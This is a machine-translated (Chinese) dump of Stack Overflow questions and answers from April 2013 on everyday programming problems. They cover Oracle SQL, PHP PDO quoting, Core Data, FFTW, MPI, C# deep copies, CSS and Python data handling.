> 赞同：0
> 
> 时间：2013-04-25T01:28:32.803

是的，只需将逻辑放在适配器的 getView 方法中，例如：

```
public View getView(int position, View convertView, ViewGroup parent) {
   View myView;

   if(convertView == null) {
       myView = new MyView();
} else {
     myView = (MyView) convertView;
}

if(myList.get(position).isExpense) {
    myView.setBackgroundColor(Color.RED);
} else {
   myView.setBackgroundColor(Color.GREEN);
}
   return myView;       

} 
```

**编辑：**

是的，我看到您使用的是`SimpleAdapter`. 这不足以做你想做的事。`BaseAdapter`您需要通过子类化（或类似的东西）和覆盖必要的方法来创建自己的适配器，例如`getView`我上面显示的。

# sql - 从 oracle sql 查询的输出中删除重复值

> ID：16204768
> 
> 赞同：2
> 
> 时间：2013-04-25T01:05:31.063
> 
> 标签：sql, oracle, oracle10g

我有一种情况，我想通过在 oracle 10g 中使用 sql 查询从结果中删除重复的记录。我正在使用正则表达式从结果中删除字母

> 原始值 = 1A,1B,2C,2F,4A,4z,11A,11B

当前 Sql 查询

```
select REGEXP_REPLACE( tablex.column, '[A-Za-z]' , '' )
from db1 
```

给我以下输出

> 1,1,2,3,4,4,11,11

如何从输出中删除重复项以仅显示唯一值，即

> 1,2,3,4,11

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T04:32:40.150

假设您的表包含值用逗号分隔的字符串。

您可以尝试这样的事情：
[这是一个 sqlfiddle 演示](http://www.sqlfiddle.com/#!4/43cdb/71)

```
select rtrim(xmltype('<r><n>' || 
               replace(REGEXP_REPLACE( col, '[A-Za-z]' , '' ), ',', ',</n><n>')||',</n></r>'
              ).extract('//n[not(preceding::n = .)]/text()').getstringval(), ',')
from tablex; 
```

它所做的是在使用你的之后，`regexp_replace`它会从中生成一个 xmltype，然后用于`XPATH`获取所需的输出。

如果您还想对值进行排序（并且仍然使用 xml 方法），那么您需要 XSL

```
select rtrim(xmltype('<r><n>' || 
               replace(REGEXP_REPLACE( col, '[A-Za-z]' , '' ), ',', '</n><n>')||'</n></r>'
              ).extract('//n[not(preceding::n = .)]')
.transform(xmltype('<?xml version="1.0" ?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:for-each select="//n[not(preceding::n = .)]"><xsl:sort select="." data-type="number"/><xsl:value-of select="."/>,</xsl:for-each></xsl:template></xsl:stylesheet>'))
.getstringval(), ',')              
from tablex; 
```

但是您也可以尝试不同的方法，例如将标记拆分为行，然后重新收集它们

```
select rtrim(xmlagg(xmlelement(e, n || ',') order by to_number(n))
              .extract('//text()'), ',')
from(
SELECT distinct rn, trim(regexp_substr(col, '[^,]+', 1, level)) n
  FROM (select row_number() over (order by col) rn ,
               REGEXP_REPLACE( col, '[A-Za-z]' , '' ) col
        from tablex) t
CONNECT BY instr(col, ',', 1, level - 1) > 0
)
group by rn; 
```

# php - 插入：mysql_real_escape_string 替代

> ID：16204769
> 
> 赞同：-1
> 
> 时间：2013-04-25T01:05:34.500
> 
> 标签：php, mysql, pdo

```
 $q = "INSERT INTO articles VALUES( mysql_real_escape_string($_GET["article"]) )
 $req = $bdd->prepare($q); 
 $req ->execute(); 
```

我一直在另一个 mysql_real_escape_string() 还没有过时的服务器上工作，现在我正在将站点移动到另一个显然不再接受此功能的 mysql 服务器。而且，很明显我需要使用一些 PDO

那么 mysql_real_escape_string() 的 PDO 等价物是什么？我正在尝试这样的事情

```
 $idc = new PDO(...);
 $q = "INSERT INTO articles VALUES( $idc->quote(($_GET["article"])));
 $req = $bdd->prepare($q); 
 $req ->execute(); 
```

我确实使用了准备好的语句，但我怀疑我的 PDO::quote 在某处是错误的。

但它不会呈现相同的结果......谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:11:48.067

`PDO::quote`相当于`mysql_real_escape_string`。如果由于某种原因您不能使用准备好的语句，您可以像这样使用它：

```
$q = "INSERT INTO articles VALUES (" . $idc->quote($_GET["article"]) . ")"; 
```

一个显着的区别是它包括字符串周围的引号，而`mysql_real_escape_string`没有（所以你必须在你的`INSERT`字符串中加上引号）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T01:11:00.890

使用[准备好的语句](http://www.php.net/manual/en/pdo.prepared-statements.php)（首选）或[`PDO::quote()`](http://www.php.net/manual/en/pdo.quote.php)

# c++ - c++：基类指针的搜索向量

> ID：16204771
> 
> 赞同：1
> 
> 时间：2013-04-25T01:05:49.553
> 
> 标签：c++, python, class, hash

我正在尝试为 Python 的`list`. 有一些对象派生自 class `Object`。还有类`List`，这只是`std::vector<Object*>`. 所有类都有`clone`功能（以及其他一些功能）。现在我正在尝试提供一种为给定元素（如 Python 的`list.index`）查找索引的可能性。将来提供排序的可能性也很好，即比较`List`类内的对象。我怎样才能在不超载的情况下实现它`operator==`？我听说过散列算法。是不是我要找的东西？如果是，您能否建议一个库或（更好）我如何使用原始 C++ 来实现它？

提前致谢！

# ios - 保存核心数据布尔字段时出现 EXC_BAC_ACCESS 错误

> ID：16204772
> 
> 赞同：1
> 
> 时间：2013-04-25T01:05:50.013
> 
> 标签：ios, xcode, core-data, boolean, nsmanagedobject

`EXC_BAC_ACCESS`尝试将 TRUE 值保存到包含`Boolean`属性的托管对象中时出现错误。

```
 id delegate = [[UIApplication sharedApplication] delegate];
    self.managedObjectContext = [delegate managedObjectContext];

    NSFetchRequest *fetchRequest = [[NSFetchRequest alloc] init];
    NSEntityDescription *entity = [NSEntityDescription entityForName:@"TrafficCameraInfo"
                                              inManagedObjectContext:self.managedObjectContext];

    [fetchRequest setEntity:entity];
    [fetchRequest setPredicate:[NSPredicate predicateWithFormat:@"code=%@",self.selectedTrafficCamera.code]];

    NSError *error;
    TrafficCameraInfo *cgTrafficCamera;

    cgTrafficCamera = [[self.managedObjectContext executeFetchRequest:fetchRequest error:&error] lastObject];

    NSString *alertMessage;
    if (cgTrafficCamera.favourite == NO){
        cgTrafficCamera.name = @"TEST";                  <-- works ok
        cgTrafficCamera.favourite = 1;                   <-- causes an error
    } else {
        cgTrafficCamera.favourite = 0;
    }

    error = nil;
    if (![self.managedObjectContext save:&error]) { 
```

托管对象接口如下所示：

```
@interface TrafficCameraInfo : NSManagedObject

@property (nonatomic, retain) NSString *code;
@property (nonatomic, retain) NSString *postCode;
@property (nonatomic, retain) NSNumber *latitude;
@property (nonatomic, retain) NSNumber *longitude;
@property (nonatomic, retain) NSString *name;
@property (nonatomic, retain) NSString *url;
@property (nonatomic) Boolean favourite;

@end 
```

在我的应用程序的其他地方，我通过将 1 传递给另一个布尔字段来更新它并且没有遇到问题。

任何想法是什么导致了错误？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T09:04:40.017

我认为在您的核心数据属性表中，您将“最喜欢的”变量定义为 BOOL，这意味着它是 NSNumber 类型，因此您应该使用 NSNumber 设置数据

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T06:15:00.800

布尔值是一种简单的标量非指针数据类型。Core Data 属性始终存储为对象。数字数据类型的 Objective-C 对象包装器是 NSNumber。因此，如果`favourite`是常规存储属性，则应将其声明为：

```
@property (nonatomic, retain) NSNumber *favourite; 
```

分配将像这样完成：

```
cgTrafficCamera.favourite = [NSNumber numberWithBool:YES]; // Obj-C style is "YES/NO" for BOOL 
```

或者，如果您愿意，可以这样做：

```
cgTrafficCamera.favourite = [NSNumber numberWithBool:1]; 
```

如果您不需要存储布尔值，您可以保留它并使其成为瞬态属性。在这种情况下，您可能需要摆脱“（非原子）”。

# java - 正确舍入非终止（非理性）BigDecimal

> ID：16204775
> 
> 赞同：1
> 
> 时间：2013-04-25T01:05:59.533
> 
> 标签：java, bigdecimal

我有一个数学问题。我有一个不合理的 BigDecimal ，我想对其进行四舍五入，但是如果有意义的话，我想在它开始重复*之后对其进行四舍五入。*例如，如果我有

0.76489512147147147147147147147147

我希望它四舍五入

0.76489512147

因为其余的只是 147 重复。

是否有 Java 功能可以做到这一点？还是我需要实现某种算法？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:10:47.540

您给出的示例数字实际上是有理数 - 无理数（例如 pi 或 2 的平方根）永远不会重复。

您可以使用[JScience](http://jscience.org/)库，它有一个[Rational](http://jscience.org/api/org/jscience/mathematics/number/Rational.html)类，可以精确地表示像 0.764895121[47] 重复这样的数字。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-29T23:29:23.127

通过将输出视为字符串并应用一些正则表达式功夫，这个问题很容易解决：

```
// Replace the smallest repeating trailing group with 1 copy of itself
String truncated = a.replaceAll("(.+?)(?=\\1+$).*", "$1"); 
```

下面是一些测试代码：

```
BigDecimal bd = new BigDecimal("0.76489512147147147147147147147147");
String s = bd.toString();
// Replace the smallest repeating trailing group with 1 copy of itself
String truncated = s.replaceAll("(.+?)(?=\\1+$).*", "$1");
System.out.println(truncated); 
```

输出：

```
0.76489512147 
```

# c++ - 尝试计算 2 个图像的 FFT（快速傅里叶变换）时访问冲突

> ID：16204779
> 
> 赞同：0
> 
> 时间：2013-04-25T01:06:16.613
> 
> 标签：c++, image-processing, access-violation, fftw

我正在尝试对两个原始图像进行 FFT。但我得到了`unhandled exception (access violation)`- 我不知道为什么。我正在使用 fftw 库。首先我正在阅读两个图像，然后我计算 FFT。但在它开始计算之前，它会产生访问冲突错误。

```
#include "stdafx.h"
#include <iostream>
#include <conio.h>
#include "fftw3.h"

#define Width 2280
#define Height 170

unsigned char im2[170*2280];
unsigned char im1[170*2280];
float image1[170*2280];
float image2[170*2280];

using namespace std;

int _tmain(int argc, _TCHAR* argv[])
{

    FILE* fp1, *fp2;

    //Read two images

    fp1 = fopen ("image1.raw" , "r");
    fread(im1, sizeof(unsigned char), Width* Height, fp1);

    fp2 = fopen ("image2.raw" , "r");
    fread(im2, sizeof(unsigned char), Width* Height, fp2);

    fclose(fp2);
    fclose(fp1);

    //Typecasting two images into float

    for (int i = 0; i < Width* Height; i++)
    {       
        image1[i]= (float)im1[i];
        image2[i] = (float)im2[i];

    }

    fftwf_plan fplan1, fplan2;
    fftwf_complex fft1[((Width/2)+1)*2];
    fftwf_complex fft2[((Width/2)+1)*2];

    fplan1 = fftwf_plan_dft_r2c_2d(Height, Width, (float*)image1, fft1, FFTW_ESTIMATE);
    fftwf_execute(fplan1);
    fftwf_destroy_plan(fplan1);

    fplan2 = fftwf_plan_dft_r2c_2d(Height,Width, image2, (fftwf_complex*)fft2, FFTW_ESTIMATE);
    fftwf_execute(fplan2);
    fftwf_destroy_plan(fplan2);

    _getch();
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T05:32:18.420

`fft1` and `fft2` are only large enough to hold one output row - you need `Height` rows. You'll probably want to allocate them dynamically too, as they will most likely be too large for the stack once you have the correct size, e.g.

```
fftwf_complex *fft1 = new fftwf_complex[((Width/2)+1)*2*Height];
fftwf_complex *fft2 = new fftwf_complex[((Width/2)+1)*2*Height]; 
```

NB: don't forget to call `delete []` to free these later.

# c - MandelBrot 集应用中的 C X11 分段错误

> ID：16204782
> 
> 赞同：0
> 
> 时间：2013-04-25T01:06:29.660
> 
> 标签：c, segmentation-fault, x11, zooming, mandelbrot

我一辈子都找不到这个段错误。一旦我启动，它就会不断发生在从属进程上。我已经开发了一个可以完美运行的标准应用程序，但是当我尝试实现缩放功能时遇到了这个问题。

任何帮助是极大的赞赏。

我的部分代码：

```
int rank, processes, i, j, x, y;

MPI_Status status;
MPI_Init(&argc, &argv); 
MPI_Comm_size(MPI_COMM_WORLD, &processes); 
MPI_Comm_rank(MPI_COMM_WORLD, &rank);

Window win; // initialization for a window
GC gc; // graphics context
Display *display = NULL;
unsigned int width = X_RESN, height = Y_RESN; /* window size */
clock_t start, end, elapsed;

int changed = 1;

int* pixelChunk;
int** pixelSet;

if(rank==0)
{
    display = x11setup(&win, &gc, width, height);
    pixelSet = create2DArray(X_RESN, Y_RESN);

    int i;

    double pixelFactors[4];
    pixelFactors[0] = imin;
    pixelFactors[1] = imax;
    pixelFactors[2] = rmin;
    pixelFactors[3] = rmax;

    for(i = 1; i < processes - 1; i++)
    {
        MPI_Send(&pixelFactors, sizeof(double) * 4, MPI_DOUBLE, i, PIXEL_FACTORS, MPI_COMM_WORLD);
        assignTask(i);
    }
}
else
{
    pixelChunk = malloc(sizeof(int) * (Y_RESN+1));
}

// main loop
int running = 1; // loop variable
start = clock();
while(running) 
{
    if(rank==0) 
    {
        if(XPending(display)) 
        {
            XEvent ev;
            XNextEvent(display, &ev);
            switch(ev.type) 
            {               
                case ButtonPress:
                {
                    int xPos = ev.xbutton.x;
                    int yPos = ev.xbutton.y;

                    int xCenter = ((xPos / X_RESN) * (rmax - rmin)) + rmin;
                    int yCenter = ((yPos / Y_RESN) * (imax - imin)) + imin;

                    double xmin = xCenter - 2;
                    double xmax = xCenter + 2;
                    double ymin = yCenter - 2;
                    double ymax = yCenter + 2;

                    double pixelFactors[4];

                    if(ev.xbutton.button == 1) //Left click, zoom in
                    {
                        xmin += 0.1;
                        xmax -= 0.1;
                        ymin += 0.1;
                        ymax -= 0.1;
                    }
                    else if(ev.xbutton.button == 2) //Right click, zoom out
                    {
                        xmin -= 0.1;
                        xmax += 0.1;
                        ymin -= 0.1;
                        ymax += 0.1;
                    }

                    pixelFactors[0] = ymin;
                    pixelFactors[1] = ymax;
                    pixelFactors[2] = xmin;
                    pixelFactors[3] = xmax;

                    tasks = X_RESN-1;
                    changed = 1;

                    for(i = 1; i < processes - 1; i++)
                    {
                        MPI_Send(&pixelFactors, sizeof(double) * 4, MPI_DOUBLE, i, PIXEL_FACTORS, MPI_COMM_WORLD);
                        assignTask(i);
                    }
                }
            }
        }
    }
    else
    {
        //Calculate MandelBrot Set
        int taskNo;
        double pixelFactors[4];

        MPI_Recv(&pixelFactors, sizeof(double) * 4, MPI_DOUBLE, 0, PIXEL_FACTORS, MPI_COMM_WORLD, &status);
        MPI_Recv(&taskNo, sizeof(int), MPI_INT, 0, TASK_ASSIGNMENT, MPI_COMM_WORLD, &status);

        imin = pixelFactors[0];
        imax = pixelFactors[1];
        rmin = pixelFactors[2];
        rmax = pixelFactors[3];

        int x, y;
        complex c;

        double xPixelFactor = (rmax-rmin)/X_RESN;
        double yPixelFactor = (imax-imin)/Y_RESN;

        x = taskNo;

        if(changed == 1)
        {   
            for (y = 0; y < Y_RESN; y++)
            {
                complex imaginary;
                imaginary.real = 0;
                imaginary.imag = 1;
                c.real = rmin + (x * xPixelFactor);
                c.imag = (imin + (y * yPixelFactor)) * imaginary.imag;

                pixelChunk[y] = calculatePixel(c);
            }

            pixelChunk[Y_RESN] = taskNo;

            //SEND
            MPI_Send(&pixelChunk[0], Y_RESN+1, MPI_INT, 0, TASK_RESULT, MPI_COMM_WORLD);
        }

    }

    //RECEIVE
    if(rank == 0)
    {
        while(tasks > -1 || working > 0)
        {
            int* chunk = malloc(sizeof(int) * (Y_RESN+1));
            MPI_Recv(&chunk[0], Y_RESN+1, MPI_INT, MPI_ANY_SOURCE, TASK_RESULT, MPI_COMM_WORLD, &status);

            int process = status.MPI_SOURCE;
            int taskID = chunk[Y_RESN];
            working--;

            int k;

            for(k = 0; k < Y_RESN; k++)
            {
                pixelSet[taskID][k] = chunk[k];
            }   

            if(tasks > -1)
            {
                double pixelFactors[4];
                pixelFactors[0] = imin;
                pixelFactors[1] = imax;
                pixelFactors[2] = rmin;
                pixelFactors[3] = rmax;

                MPI_Send(&pixelFactors, sizeof(double) * 4, MPI_DOUBLE, process, PIXEL_FACTORS, MPI_COMM_WORLD);

                assignTask(process);
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:46:11.640

找到了。与我发送/接收双打数组的方式有关。

将其更改为`MPI_Send(&pixelFactors[0], 4, MPI_DOUBLE, i, PIXEL_FACTORS, MPI_COMM_WORLD);`，我停止收到分段错误。

# c# - 对新列表的修改与原始列表重复

> ID：16204783
> 
> 赞同：0
> 
> 时间：2013-04-25T01:06:29.780
> 
> 标签：c#, .net

所以我有一个列表，在我的方法中我试图返回一个带有修改的新列表。

但问题是我对线索列表的 ID 所做的更改也正在对我传递的线索列表进行。

```
 public List<Clue> NewOrderList(List<Clue> clues, int[] ids)
    {
        var newClueOrder = new List<Clue>();

        // For each ID in the given order
        for (var i = 0; i < ids.Length; i++)
        {
            // Get the original clue that matches the given ID
            var clue = clues.First(clue1 => clue1.Id == ids[i]);

            // Add the clue to the new list. 
            newClueOrder.Add(clue);

            // Retain the ID of the clue 
            newClueOrder[i].Id = clues[newClueOrder.Count - 1].Id;
        }

        return newClueOrder;
    } 
```

为什么会这样，最好的解决方案是什么？我见过类似的问题，但老实说，我不太明白解决方案到底是什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:15:35.177

你创建了一个浅拷贝。听起来您想要列表的深层副本。因此，我将首先创建一个深层副本，然后修改您需要修改的任何内容并返回新列表。

您可以序列化和反序列化列表以创建深层副本

当您创建列表的深层副本时，您正在创建新的线索对象，而不仅仅是像在浅层副本中那样引用它们

```
 public List<Clue> NewOrderList(List<Clue> clues)
   {
        List<Clue> newstringOrder = CreateDeepCopy(clues);

        // Add code to modify list

        return newstringOrder;
   }

public List<Clue> CreateDeepCopy(List<Clue> c)
{
     //Serialization    
     if(c == null)
            return null;
     BinaryFormatter bf = new BinaryFormatter();
     MemoryStream ms = new MemoryStream();
     bf.Serialize(ms, c);

     //Deserialization              
     ms.Position = 0;        
     List<Clue> list = (List<Clue>)bf.Deserialize(ms);       

     return list;    

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:15:27.083

这是因为`Clue`是引用类型。您不是在创建新`Clue`实例，而是在更改现有实例。

为了解决这个问题，您需要使用复制构造函数或某种克隆来获取深层副本：

```
 // Get the original clue that matches the given ID
        var clue = clues.First(clue1 => clue1.Id == ids[i]);

        // Copy constructor
        var newClue = new Clue(clue);

        // Or, use cloning
        var newClue = clue.Clone();

        // Add the clue to the new list. 
        newClueOrder.Add(newClue);

        // Retain the ID of the clue 
        newClueOrder[i].Id = clues[newClueOrder.Count - 1].Id; 
```

在`Clone()`or 复制构造函数中，您需要复制所有其他非不可变引用类型，而不仅仅是重新分配引用。例如，假设线索有：

```
public class Clue
{
    ...

    public Clue Clone()
    {
        Clue newClue = new Clue();
        newClue.SomeClassType = this.SomeClassType.Clone(); // You'll need to get a clone or copy of all non-immutable class members as well.
        newClue.Id = this.Id;  // Value types are copied by value, so are safe to assign directly.
        newClue.Name = this.Name;  //If Name is a string, then this is safe too, since they are immutable.
        return newClue;
    }
} 
```

# windows - Windows 7 在启动过程和登录之前连接到网络

> ID：16204789
> 
> 赞同：2
> 
> 时间：2013-04-25T01:06:57.680
> 
> 标签：windows, networking, startup, winlogon

我有以下问题。我开发了一个必须在登录 Windows 7 之前执行的脚本。除其他外，该脚本必须通过给定的 Internet 主机进行身份验证并将返回结果保存到 txt 文件中。问题是当脚本启动时，它找不到网络连接并且身份验证失败。

要将脚本添加到启动中，我遵循了本教程：[在登录 Windows 之前连接到 VPN](http://htipe.wordpress.com/2010/02/11/connect-to-vpn-before-logging-in-to-windows/)

我已经尝试在 gpedit.msc 的计算机配置/管理模板/系统/登录中启用“在启动和登录时始终等待网络”，但它不起作用。

有没有人遇到过这样的问题？有什么提示吗？我只想强制有线网络在运行启动脚本之前完全准备好并正常工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-07-24T18:47:10.170

尝试这个。我在另一个论坛上找到的。

`Computer Configuration -> Administrative Templates -> System -> Group Policy -> set Startup policy processing wait time`在本地组策略编辑器中转到`120`。

由于某种原因，“在计算机启动和登录时始终等待网络”并不总是有效，这似乎只是时间问题。大约 80% 的时间我会收到“没有可用的域控制器”的错误。“启动策略处理等待时间”的附加延迟使得自动登录始终有效。

# html - 填充和文本 - 被剪切的文本

> ID：16204793
> 
> 赞同：0
> 
> 时间：2013-04-25T01:07:13.640
> 
> 标签：html, css

我正在尝试将 div 内容与填充底部对齐。但是，由于某种原因，填充会不断剪切文本。您可以在 cssdeck 链接 [http://cssdeck.com/labs/wpj8sl4k上查看工作示例](http://cssdeck.com/labs/wpj8sl4k)

如您所见，文本的底部已被剪切，当填充被删除时，一切都恢复正常。

建议表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:18:42.400

`#content2` *也*遵循相同的 CSS 规则，所以会出现在`#content`. 如果您实际向其中添加内容，这一点尤其明显，并且效果可能是不可取的。如果你想`#content1`和`#content2`一起流动，你应该把它们都包裹在绝对定位的 div 中，并给它们静态定位。

[http://cssdeck.com/labs/ctxinf3b](http://cssdeck.com/labs/ctxinf3b)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:16:25.730

你通过说#content div来影响两个div。你想要的是#content div#content1。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T01:20:29.420

从你的身体中删除以下内容，它会正常工作。

```
<div id="content2">
</div> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-25T01:22:09.133

使用特定的*填充*和*边距*

```
#content div{
    padding-left: 24px;
    padding-right: 24px;
    margin-bottom: 24px;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-26T06:17:53.253

是的，正如米沙克所说

删除这些行。这没有任何意义。

```
<div id="content2">
</div> 
```

祝你好运！

# python - 如何将两个未知大小的依赖输入与变量联系起来

> ID：16204799
> 
> 赞同：1
> 
> 时间：2013-04-25T01:07:53.653
> 
> 标签：python, variables, input, interactive

这是我的第一个 python 脚本。我的数据如下所示：

```
Position ind1 ind2 ind3 ind4 ind5 ind5 ind7 ind8
 0        C    A     C   A    A    A    A     A
 1        C    A     C   C    C    A    A     A 
```

但它的列数可能会有所不同，并且有数千行。

我的脚本执行我需要的操作，逐行读取此文件，并计算每个位置 (POS) 中个人（以下称为人口）组合的 A 和 C 的频率。例如人口 1 (ind1, ind2, ind3, ind4) 的位置 0 的 A 的频率；对于人口 2 (ind5, ind6, ind7, ind8)，A 在位置 0 的频率和频率，那么对于 POS 1、2、3 ... 也是如此。

为此，我通过以下代码在我的脚本中定义列（人口）的组合：

```
alleles1 = alleles[1:5]
alleles2 = alleles[5:] 
```

但如果我有超过 9 列和不同的列组合，我需要在之后修改等位基因*和脚本的其余部分。

**我想让我的程序更具交互性，用户定义人口数量并指定哪一列对应于哪个人口。**

我到目前为止的代码：

```
#ask for the number of populations
try:
    num_pop = int(raw_input("How many populations do you have? > "))
except ValueError:
    print "In is not an integer! \nThe program exits...\n "
#ask for individuals in population
ind_pop = {}
for i in range(num_pop):
    i += 1
    ind_input = str(raw_input("Type column numbers of population %i > " % i))
    ind_pop[i] = re.findall(r'[^,;\s]+', ind_input) 
```

如果我有 2 个人口，其中第 3、5、6 列是人口 1，第 2、5 列是人口 2。它以这种方式工作：

```
> How many populations do you have? > 2
> Type column numbers of population 1 > 3, 5, 6  
> Type column numbers of population 2 > 2, 4 
```

输入存储在字典中。

```
{1: ['3', '5', '6'], 2: ['2', '4']} 
```

**问题是如何从这个输入着手定义等位基因。输出应该是这样的：**

```
allele1 =  [allele[3], allele[5], allele[6]]
allele2 =  [allele[2], allele[4]] 
```

如果有必要，这里是其余代码的主要部分：

```
with open('test_file.txt') as datafile:
  next(datafile)
  for line in datafile:
    words = line.split() #splits string into the list of words 
    chr_pos = words[0:2] #select column chromosome and position
    alleles = words[2:] # this and next separates alleles for populations

    alleles1 = alleles[0:4]
    alleles2 = alleles[4:8]
    alleles3 = alleles[8:12]
    alleles4 = alleles[12:16]

    counter1=collections.Counter(alleles1)
    counter2=collections.Counter(alleles1)
    counter3=collections.Counter(alleles1)
    counter4=collections.Counter(alleles1)
#### the rest of the code and some filters within the part above were spiked 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:28:23.773

您首先需要将列号转换为整数

```
 ind_pop[i] = [int(j) for j in re.findall(r'[^,;\s]+', ind_input)] 
```

（我还将您的正则表达式更改为`r'\d+'`）

然后，而不是拥有`alleles1`等`alleles2`，拥有一个主列表或字典：

```
master = {i: [alleles[j] for j in vals] for i, vals in ind_pop.items()}
counters = {i: collections.Counter(al) for i, al in master.items()} 
```

然后你可以访问`counters[i]`而不是`counter1`等。

作为旁注，您可以通过制作`ind_pop`一个列表来简化上述所有内容，使用`append`而不是保留计数器

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T22:21:24.120

感谢您的建议。其中一些很有用。我觉得我需要改变方向。我将继续使用列表列表：

```
pop_alleles = []
for key in ind_pop.keys():
  pop_alleles.append([alleles[el] for el in ind_pop[key]]) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T01:13:52.887

如果这是您正在寻找的输出，

```
allele1 =  [allele[3], allele[5], allele[6]]
allele2 =  [allele[2], allele[4]] 
```

你有这个：

```
{1: ['3', '5', '6'], 2: ['2', '4']} 
```

从这里开始很简单。

```
for index in population_dict[1]:
    allele1.append(allele[index])
for index in population_dict[2]:
    allele2.append(allele[index]) 
```

哦，如果索引存储为字符串，就像它们在上面一样，您需要先将它们设为整数。您可以将上面的内容更改为等位基因[int(index)]，但是当您阅读它们时最好将它们变成整数。

# c++ - 在 #define 开头使用下划线作为包含保护

> ID：16204801
> 
> 赞同：4
> 
> 时间：2013-04-25T01:08:15.270
> 
> 标签：c++, xcode

[该答案](https://stackoverflow.com/a/228797/768472)指向参考材料，指出您不应使用两个下划线后跟一个大写字母。

然后是@metal[对这个问题](https://stackoverflow.com/questions/15557406/exception-to-the-rule-of-three)的第一个评论，它说你在创建包含防护时也不能使用这样的名称。

但是，我很好奇为什么 Xcode 在自动为新的 C++ 文件创建包含防护时会这样做：

```
#ifndef __DataSource__File__
#define __DataSource__File__

#include <iostream>

#endif 
```

这是 Xcode 放置在新 C++ 文件顶部的标准 biolerplate；在这种情况下，项目被命名为“DataSource”。如果项目名称以数字开头，那么 Xcode 将用第三个下划线替换该数字。

如果用户写这个是非法的，那么 Xcode 写这个不是非法的吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T01:28:57.053

> 如果用户写这个是非法的，那么 Xcode 写这个不是非法的吗？

事实上，虽然“非法”可能是一个相当强烈的词。如果这是默认行为，那么无论谁将其配置为生成狡猾的包括警卫，都不知道您不应该这样做。可悲的是，并不是每个软件开发人员（即使是那些制作开发工具的人）都完全了解他们使用的语言和工具。

很多人喜欢用奇怪的下划线图案来装饰他们的 include 守卫，尽管他们不应该这样做。据推测，他们看到它在标准库头文件中完成（应该如此，因为这是保留这些名称的那种东西）并假设他们出于某种原因应该做同样的事情。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-25T01:28:27.807

Xcode 是错误的。以下划线后跟大写字母的名称和包含两个连续下划线的名称保留给实现。一直都是。

# jquery - 纵向滑块 (JQuery)

> ID：16204802
> 
> 赞同：0
> 
> 时间：2013-04-25T01:08:25.427
> 
> 标签：jquery, slider, nivo-slider

我已经为此尝试过 Nivo Slider，但我发现很难将其转换为纵向。有一个简单的方法吗？我的意思是，我是这个领域的新手，我已经为此工作了几天。谢谢！我没有代码，我只想要一个纵向，图像实际上会根据滑块的宽度和高度调整大小。谢谢！

PS我正在关注本教程，但我无法使其工作。链接： http: [//net.tutsplus.com/tutorials/design-tutorials/code-your-own-juicy-tabbed-slider-using-the-nivo-slider/](http://net.tutsplus.com/tutorials/design-tutorials/code-your-own-juicy-tabbed-slider-using-the-nivo-slider/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T02:07:01.383

使用[sudoSlider](http://webbies.dk/SudoSlider/)，它非常简单、免费，并且您拥有[您可能需要的所有示例](http://webbies.dk/SudoSlider/demos.html#all-demos)

# spring-mvc - 春季安全会话 - 在应用程序中使用

> ID：16204806
> 
> 赞同：0
> 
> 时间：2013-04-25T01:08:48.830
> 
> 标签：spring-mvc, spring-security

我了解 Spring Security 正在创建一个新会话。就我而言，这对 Gemfire 来说是持久的。当用户登录时，应用程序正在检查会话是否存在，如果存在，则将身份验证成功放入会话属性中。此外，成功登录后会创建一个新会话。

这里的问题是，在登录后（这里是 spring security），应用程序（不是 spring 安全框架）创建一个新的 session cookie 并作为 session cookie 值返回，因此当我点击任何主页链接时（受保护/*) 为新会话中的任何身份验证令牌检查会话 cookie 值。因为，这最初不是持久的，所以用户被重定向到登录页面。

IMO 的问题是应用程序应该共享由 spring 安全框架创建的会话，并且不应该在应用程序端创建一个新的会话。

可能的根本原因和解决方法是什么？帮助真的很感激..谢谢。

# php - 多个 MySQL 查询或一个具有多个 JOIN 的查询？

> ID：16204809
> 
> 赞同：0
> 
> 时间：2013-04-25T01:09:01.893
> 
> 标签：php, mysql, loops, join

通常对我来说显而易见的答案是“几个连接”。但情况是这样的：我有一个包含几千个条目的表，tableA。我有另一个包含数千个条目的表，tableB。每个条目都有一个与 tableA 中行的 id 相关的数字。tableB 中将有多行与 tableA 中的单行一起使用。将有第三个表 tableC，其中包含数万个条目。它将有多行对应于 tableB 中的单行。

查询可能看起来像这样：（细节并不重要）

```
SELECT tableA.*, tableB.*, tableC.* LEFT JOIN tableB ON tableB.idA = tableA.id LEFT JOIN tableC ON tableC.idB = tableB.id WHERE tableA.id = some_number; 
```

这工作得很好而且很花哨，但是由于加入，我得到了大量的重复行。我想要 tableA 的一个结果，tableB 的一些结果和 tableC 的几个结果。

不幸的是，为此我使用了许多嵌套的 PHP 数组和 for 循环。它变得很乱，所以我想知道我是否应该只使用 3 个单独的查询来摆脱所有嵌套的 PHP 循环，还是应该坚持使用 JOINS？

**附加信息：** “tableA”：工作 ID（主键）名称描述日期时间客户状态

